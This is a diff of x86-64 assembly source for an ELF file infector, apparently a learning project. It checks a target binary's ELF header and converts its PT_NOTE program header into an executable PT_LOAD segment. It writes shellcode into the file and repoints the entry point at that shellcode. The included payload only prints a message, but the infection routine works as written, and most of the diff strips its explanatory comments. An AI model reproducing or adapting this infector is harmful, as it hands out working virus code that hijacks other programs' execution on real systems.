@@ -1,3 +1,4 @@
+
 section .data
     filename db "HelloWorld", 0          ; Nom du fichier ELF à analyser
     elf_message db 'ELF file detected', 0 
@@ -21,18 +22,18 @@ section .data
 
 
 section .bss
-    buffer resb 64   ;Buffer pour lecture de l'entête
-    buffer2 resb 16056      ;Buffer pour se déplacer a la zone de l'infection  
-    programmheader resb 56   ;buffer pour lire les programm header     
-    type_buffer resb 16 ;buffer pour le type
-    bufferconv resb 16   ; buffer pour la conversion
+    buffer resb 64   
+    buffer2 resb 16056        
+    programmheader resb 56        
+    type_buffer resb 16
+    bufferconv resb 16  
   
 
 section .text
 global _start
 
 _start:
-    ;Ouvre le fichier
+    
     mov rax, 2               
     lea rdi, [rel filename]  
     mov rsi, 2              
@@ -48,7 +49,7 @@ _start:
     ;mov rdx, 7              
     ;syscall
 
-   ;Lis les 64 prmeiers octets du fichier
+   
     mov rax, 0               
     mov rdi, r12            
     lea rsi, [rel buffer]     
@@ -64,10 +65,8 @@ _start:
     ;mov rdx, 28              ; Longueur du message
     ;syscall
 
-    ;tentatice de sauvegarde de l'entrypoint
     mov r15, [buffer + 0x18] 
 
-    ;comparaison de chaque octet avec la signature elf 
     lea rbx, [rel buffer]    
     mov al, byte [rbx]      
     cmp al, 0x7f            
@@ -87,9 +86,7 @@ _start:
     mov al, byte [rbx]
     cmp al, 0x46            
     jne _exit_with_error     
-    
 
-    ;Message de elf détecté
     mov rax, 1               
     mov rdi, 1              
     lea rsi, [rel elf_message] 
@@ -103,14 +100,14 @@ _start:
     mov rdx, 1         
     syscall
 
-    ;;lis le type et le convertit
+    ;;lis le type
     lea rbx, [rel buffer]    
     mov ax, word [rbx+16]    
+    
     movzx rdi, ax            
     lea rsi, [rel type_buffer] 
     call num_to_str          
-    
-    ;Afiiche le type
+
     mov rax, 1               
     mov rdi, 1               
     lea rsi, [rel type_buffer] 
@@ -125,26 +122,24 @@ _start:
     syscall
 
 
-    ;trouve le nombre de headers
+
     mov rcx, [buffer + 56]     
     lea rsi, [rel bufferconv] 
     mov rdi, rcx             
     call num_to_str          
 
-    ;affiche le nombre de headers
     mov rax, 1               
     mov rdi, 1               
     lea rsi, [rel nbheaders]
     mov rdx, 17             
     syscall
 
-      ; Afficher un espace
+      ; Afficher le retour à la ligne
     ;mov rax, 1          
     ;mov rdi, 1         
     ;lea rsi, [rel newline] 
     ;mov rdx, 1          
     ;syscall
-
 
     mov rax, 1             
     mov rdi, 1               
@@ -160,7 +155,7 @@ _start:
     syscall
     
 
-    ;Définis des valeurs pour les entetes mais plus torp utilisés certaines
+  
     mov rbx, [buffer+ 32]    
     mov rcx, [buffer + 56]     
     mov rdx, [buffer + 54]  
@@ -180,7 +175,7 @@ boucle:
     ;mov rdx, 23              
     ;syscall
 
-    ;lis 56 octets dans le biffer programmheader
+
     mov rax, 0              
     mov rdi, r12           
     lea rsi, [rel programmheader]     
@@ -190,8 +185,7 @@ boucle:
     test rax, rax            
     js _exit_with_error  
 
-    
-    
+ 
    ; mov rax, 1          
     ;mov rdi, 1          
     ;lea rsi, [rel type] 
@@ -202,16 +196,15 @@ boucle:
     mov eax, dword [programmheader]    
     mov edi, eax            
     lea rsi, [rel bufferconv]
-    call num_to_str      
+    call num_to_str         
 
-    ;convertit le type 
     mov rax, 1               
     mov rdi, 1              
     lea rsi, [rel bufferconv]
     mov rdx, 16              
     syscall
 
-      ; Afficher l'espace
+      ; Afficher le retour à la ligne
     mov rax, 1          
     mov rdi, 1        
     lea rsi, [rel newline] 
@@ -227,21 +220,18 @@ boucle:
 
     ; Vérifier si le type est PT_NOTE
     cmp dword [programmheader], 4   
-
-    ;si c'est le bon jump a ptnote
+   
     je ptnote         
 
-    ;augmente l'offset si pas le bon segment
     add rbx, rdx 
     add r13, 56           
     dec rcx                 
     jmp boucle
 
-;Réecris le type, la taille, l'offset, memz, vadrr  du programm header et le sauvegarde et accède a la fin du fichier et y injecte le shellcode
 ptnote:
 
 
-    ; Afficher le test HEHEHEHHE
+    ; Afficher le retour à la ligne
     mov rax, 1
     mov rdi, 1
     lea rsi, [rel test1] 
@@ -255,7 +245,7 @@ ptnote:
     mov rdx, 1
     syscall
 
-     ; Afficher le TEst Crise
+     ; Afficher le retour à la ligne
     mov rax, 1
     mov rdi, 1
     lea rsi, [rel crise] 
@@ -269,7 +259,7 @@ ptnote:
     syscall
 
 
-    ;modifie le type en ptload les flags en Read executable , la taille du fichier et la mémoire ainsi que l'offset du fichier et vaddr
+
     mov dword [programmheader], 1
     mov dword [programmheader+4], 0x5
     mov dword [programmheader + 0x10], 112  ; p_filesz (taille réelle)
@@ -279,7 +269,7 @@ ptnote:
    
          
 
-    ; bouge le curseur à l'offset du segment ptnote
+
     mov rax, 8
     mov rdi, r12
     mov rsi, r13
@@ -288,7 +278,7 @@ ptnote:
     test rax, rax
     js _exit_with_error
 
-    ; réecris les modifications du buffer en mémoire et le sauvegarde les modifications en quelque sorte
+
     mov rax, 1
     mov rdi, r12
     lea rsi, [rel programmheader]
@@ -302,8 +292,8 @@ ptnote:
 
 
 
-    ;;;;;;;;;;;;;;;;;;;;;;;Partie injection de code
-    ; avance de 56 octets dans le fichier
+    ;;;;;;;;;;;;;;;;;;;;;;;
+
      mov rax, 0              
     mov rdi, r12           
     lea rsi, [rel programmheader]     
@@ -312,12 +302,11 @@ ptnote:
     syscall
     test rax, rax            
     js _exit_with_error  
-    
-    ;ajoute 56 a l'offset
+
     add r13, 56  
 
 
-    ;bouge le curseur au point de départ du fichier
+
      mov rax, 8
      mov rdi, r12
      mov rsi, 0x00
@@ -326,7 +315,6 @@ ptnote:
      test rax, rax
      js _exit_with_error
 
-    ; 16056 octets et donc déplace le curseur de la même distance
     mov rax, 0               
     mov rdi, r12            
     lea rsi, [rel buffer2]     
@@ -335,7 +323,6 @@ ptnote:
     test rax, rax            
     js _exit_with_error  
 
-    ;lis 56 octets et les gardes dans le mémoire
     mov rax, 0               
     mov rdi, r12            
     lea rsi, [rel programmheader]     
@@ -343,7 +330,7 @@ ptnote:
     syscall
     test rax, rax            
     js _exit_with_error  
-    ;bouge le curseur de -56 octets en arrière
+
     mov rax, 8
      mov rdi, r12
      mov rsi,0x3F28
@@ -353,7 +340,7 @@ ptnote:
      js _exit_with_error
 
 
-    ;injecte le code et l'écris
+   
      lea rsi, [rel benign_shellcode] 
      mov rdi, r12                    
      mov rdx, 43                    
@@ -368,7 +355,7 @@ ptnote:
     ;mov rdx, 4            
     ;syscall      
 
-    ;Réecris les modifications dans le buffer et le sauvegarde dans le fichier
+
     mov rax, 1
     mov rdi, r12
     lea rsi, [rel programmheader]
@@ -378,17 +365,17 @@ ptnote:
     js _exit_with_error
 
 
-    ;Affiche un message de succes
+
     mov rax, 1
     mov rdi, 1
     lea rsi, [rel success_msg]
     mov rdx, 8
     syscall
 
-    ;CHanger l'entry point a la nouvelle adresse ou le shellcode est
+    ;CHanger l'offset des segments d'après
     
     mov dword [buffer+0x18],0x3F28
-    ;bouge le curseur au point de départ 
+
     mov rax, 8
      mov rdi, r12
      mov rsi, 0x00
@@ -397,7 +384,7 @@ ptnote:
      test rax, rax
      js _exit_with_error
    
-    ;Réécris le buffer et sauvegarde la modification de l'entrypoint
+
     mov rax, 1
     mov rdi, r12
     lea rsi, [rel buffer]
@@ -444,7 +431,7 @@ close_file:
 
 
 
-; Utilisé pour convertir le type d'un segment ou du header et le rendre lisible et l'afficher
+
 num_to_str: 
     mov rbx, 10              
     xor rcx, rcx            
@@ -465,7 +452,7 @@ _exit_with_error:
     xor rdi, rdi             
     syscall    
 
-;Shellcode d'une simple injection qui affiche succès et exit
+
 benign_shellcode:
     db 0xb8, 0x01, 0x00, 0x00, 0x00   
     db 0xbf, 0x01, 0x00, 0x00, 0x00   
